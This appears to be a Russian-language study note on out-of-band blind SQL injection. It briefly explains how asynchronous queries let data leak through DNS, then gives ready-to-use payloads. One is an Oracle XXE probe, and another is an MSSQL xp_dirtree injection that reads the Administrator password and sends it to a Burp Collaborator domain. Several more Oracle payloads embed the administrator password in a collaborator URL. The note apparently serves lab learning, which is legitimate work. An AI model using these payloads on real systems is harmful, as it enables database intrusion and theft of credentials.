[[0Определение SQL Injection]] - карта раздела
## Оглавление



> [!info] Определение
> Приложение может обрабатывать запрос синхронно как в TimeBased SQL а может асинхронно то есть приложение продолжает обрабатывать запрос пользователя в исходном потоке и использует другой поток для выполнения SQL запроса с использованием отслеживающего файла куки. Запрос по прежнему уязвим для SQL инъекций, но в такой ситуации можно использовать внешние соединения с системой которой мы управляем, они могут быть массово запущены на основе введенного условия для получения информации по частям за раз. Более эффективно данные могут быть отфильтрованы непосредственно в процессе сетевого взаимодействия и для этих целей можно использовать различные сетевые протоколы и более эффективным из них является DNS, многие производственные сети допускают свободный доступ к DNS запросам потому что они необходимы для нормальной работы производственных систем


пример который можно использовать для Oracle чтобы подтвердить что уязвимость есть
```
UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//r6y5f01qglu5wy6iowivc4lxvo1fp5du.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--
```

#### использование с помощью метода OAST 
После того как мы подтвердили что уязвимость есть мы можем использовать внешний канал для взаимодействия, например: 
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
эта команда считывает пароль пользователя и отправляет на уникальный домен для бурпа, и запускает поиск в DNS 
`OAST` (out-of-band) методы являются более предпочтительными потому что имеют высокую вероятность успеха если другие методы `Blind` инъекции не сработали


|                                                                                                                                                                                                                                                                               |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| '+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'\|(SELECT password FROM users WHERE username='administrator')\|'.r6y5f01qglu5wy6iowivc4lxvo1fp5du.oastify.com"> %remote;]>'),'/l') FROM users-- |
'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.r6y5f01qglu5wy6iowivc4lxvo1fp5du.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual)||--